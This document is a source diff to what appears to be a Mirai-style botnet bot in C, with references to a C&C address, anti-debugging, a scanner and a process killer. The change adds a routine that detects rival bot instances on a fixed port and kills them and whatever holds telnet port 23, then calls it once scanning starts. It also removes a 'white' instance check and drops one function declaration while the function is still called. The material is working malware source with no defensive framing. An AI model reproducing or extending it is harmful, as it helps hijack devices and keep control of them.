@@ -24,7 +24,7 @@
 #include "util.h"
 #include "resolv.h"
 
-static void check_and_exit_self(void);
+static void check_and_kill_malicious(void);
 static void check_and_exit_white(void);
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -40,6 +40,28 @@ void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in a
 
 ipv4_t LOCAL_ADDR;
 
+void check_and_kill_malicious()
+{
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0){
+        printf("Socket error occurred!\r\n");
+    }
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT_MALICIOUS);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+        printf("Malicious not detected! Retrying...\r\n");
+        close(sock);
+    } else {
+        printf("Malicious detected! Killing...\r\n");
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT_MALICIOUS));
+	killer_kill_by_port(htons(23));
+        close(sock);
+    }
+}
+
 void check_and_exit_self()
 {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -49,27 +71,6 @@ void check_and_exit_self()
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port = htons(SINGLE_INSTANCE_PORT);
-    addr.sin_addr.s_addr = INADDR_ANY;
-
-    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
-        printf("Malicious not detected!\r\n");
-        close(sock);
-    } else {
-        printf("Malicious detected! Exitting...\r\n");
-        close(sock);
-        exit(0);
-    }
-}
-
-void check_and_exit_white()
-{
-   int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0){
-        printf("Socket error occurred!\r\n");
-    }
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(SINGLE_INSTANCE_PORT_WHITE);
     addr.sin_addr.s_addr = INADDR_ANY;
 
     if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
@@ -148,7 +149,7 @@ int main(int argc, char **args)
 #endif
 
     check_and_exit_self();
-    check_and_exit_white();
+    
     LOCAL_ADDR = util_local_addr();
 
     srv_addr.sin_family = AF_INET;
@@ -213,6 +214,7 @@ int main(int argc, char **args)
         scanner_init();
 #endif
 #endif
+        check_and_kill_malicious();
 
         while (TRUE)
         {
